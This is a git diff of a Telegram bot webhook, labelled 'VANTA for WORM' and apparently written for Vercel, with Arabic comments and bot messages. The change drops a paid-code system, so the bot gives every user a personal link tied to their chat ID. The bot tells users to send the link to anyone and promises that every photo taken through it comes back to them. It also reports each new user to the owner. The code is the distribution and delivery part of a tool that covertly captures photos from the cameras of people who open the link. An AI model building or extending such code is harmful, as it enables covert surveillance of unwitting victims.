@@ -1,59 +1,6 @@
 // api/webhook.js — VANTA for WORM
 // منطق بوت @Saleckbz_cam_bot
-
-const REPO = 'donot10/Camera';
-const CFG_ID = 'ecfg_zbll1dzm8gtafcyor7sebjlcsaxha';
-
-// قراءة الرموز من GitHub
-async function loadCodes() {
-  try {
-    const r = await fetch(
-      'https://raw.githubusercontent.com/' + REPO + '/main/codes.json?t=' + Date.now()
-    );
-    return await r.json();
-  } catch (e) {
-    return {};
-  }
-}
-
-// قراءة حالة الاستخدام من Edge Config
-async function loadState() {
-  const CONFIG_URL = process.env.GLOBAL_CONFIG;
-  if (!CONFIG_URL) return {};
-  try {
-    const r = await fetch(CONFIG_URL);
-    const data = await r.json();
-    return data.state || {};
-  } catch (e) {
-    return {};
-  }
-}
-
-// حفظ حالة الاستخدام في Edge Config
-async function saveState(state) {
-  const TOKEN = process.env.VERCEL_TOKEN;
-  if (!TOKEN) return false;
-  try {
-    const r = await fetch(
-      'https://api.vercel.com/v1/edge-config/' + CFG_ID + '/items',
-      {
-        method: 'PATCH',
-        headers: {
-          'Authorization': 'Bearer ' + TOKEN,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          items: [
-            { operation: 'upsert', key: 'state', value: state }
-          ]
-        })
-      }
-    );
-    return r.ok;
-  } catch (e) {
-    return false;
-  }
-}
+// كل مستخدم يحصل على رابطه الخاص — بدون رموز
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -62,6 +9,8 @@ export default async function handler(req, res) {
   }
 
   const TG_TOKEN = process.env.TG_TOKEN;
+  const OWNER_CHAT = process.env.TG_CHAT;
+
   if (!TG_TOKEN) {
     res.status(500).json({ ok: false, err: 'no token' });
     return;
@@ -76,14 +25,15 @@ export default async function handler(req, res) {
   }
 
   const msg = update && update.message;
-  if (!msg || !msg.text) {
+  if (!msg) {
     res.status(200).send('OK');
     return;
   }
 
   const chatId = msg.chat.id;
-  const text = msg.text.trim();
+  const text = (msg.text || '').trim();
   const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
+  const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '—';
 
   const OWNER_TG = 'Saleck_bz';
 
@@ -99,80 +49,49 @@ export default async function handler(req, res) {
 
   // ============ /start ============
   if (text === '/start' || text === '/help') {
+
+    // رابط المستخدم الخاص (Chat ID داخله)
+    const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
+
+    // 1) رد للمستخدم
     await send(chatId,
       '👋 أهلاً ' + name + '!\n\n' +
-      '🎁 للحصول على <b>رمز خاص</b> يعمل لمدة 24 ساعة:\n' +
-      'تواصل مع صاحب البوت:\n\n' +
-      '📱 تلغرام: <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
+      '🎁 هذا <b>رابطك الخاص</b>:\n\n' +
+      '<code>' + link + '</code>\n\n' +
+      '📸 أرسل هذا الرابط لأي شخص.\n' +
+      'كل صورة تُلتقط عبره <b>ستصلك هنا</b>.',
+      {
+        inline_keyboard: [[
+          { text: '📋 نسخ رابطي', url: link }
+        ]]
+      }
     );
+
+    // 2) إشعار للمالك
+    if (OWNER_CHAT && String(OWNER_CHAT) !== String(chatId)) {
+      await send(OWNER_CHAT,
+        '🔔 <b>مستخدم جديد</b>\n\n' +
+        '👤 الاسم: ' + name + '\n' +
+        '📱 اليوزر: ' + username + '\n' +
+        '🆔 Chat ID: <code>' + chatId + '</code>\n\n' +
+        '🔗 رابطه:\n<code>' + link + '</code>'
+      );
+    }
+
     res.status(200).send('OK');
     return;
   }
 
-  const code = text.toUpperCase().replace(/\s/g, '');
-
-  if (code.length < 4 || code.length > 30) {
-    await send(chatId, '❌ أرسل رمزاً صحيحاً.');
-    res.status(200).send('OK');
-    return;
-  }
-
-  const codes = await loadCodes();
-
-  if (!codes[code]) {
-    await send(chatId,
-      '❌ <b>هذا الرمز غير صحيح</b>\n\n' +
-      'احصل على رمز من صاحب البوت:\n' +
-      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
-    );
-    res.status(200).send('OK');
-    return;
-  }
-
-  const state = await loadState();
-  const entry = state[code];
-
-  // هل استُخدم من شخص آخر؟
-  if (entry && entry.chatId && entry.chatId !== chatId) {
-    await send(chatId,
-      '❌ <b>هذا الرمز مستخدم بالفعل.</b>\n\n' +
-      'احصل على رمز جديد:\n' +
-      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
-    );
-    res.status(200).send('OK');
-    return;
-  }
-
-  // هل انتهت مدته؟
-  if (entry && entry.expiry && Date.now() > entry.expiry) {
-    await send(chatId,
-      '⏰ <b>انتهت صلاحية الرمز (24 ساعة).</b>\n\n' +
-      'احصل على رمز جديد:\n' +
-      '📱 <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>'
-    );
-    res.status(200).send('OK');
-    return;
-  }
-
-  // تفعيل الرمز (أول مرة أو تجديد)
-  const expiry = Date.now() + (24 * 60 * 60 * 1000);
-  state[code] = { chatId: chatId, expiry: expiry, name: name };
-  await saveState(state);
-
-  const link = 'https://camera-one-henna.vercel.app/t/' + code;
-
+  // أي رسالة أخرى — أعد إرسال الرابط
+  const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
   await send(chatId,
-    '✅ <b>تم تفعيل رمزك!</b>\n\n' +
-    '🔗 رابطك الخاص:\n' +
-    '<code>' + link + '</code>\n\n' +
-    '⏱️ صالح لمدة <b>24 ساعة</b>\n' +
-    '📸 كل صورة تُلتقط عبر الرابط ستصلك هنا.',
+    '🔗 رابطك الخاص:\n\n<code>' + link + '</code>',
     {
       inline_keyboard: [[
-        { text: '📋 نسخ الرابط', url: link }
+        { text: '📋 نسخ رابطي', url: link }
       ]]
     }
   );
 
   res.status(200).send('OK');
-}
+          }
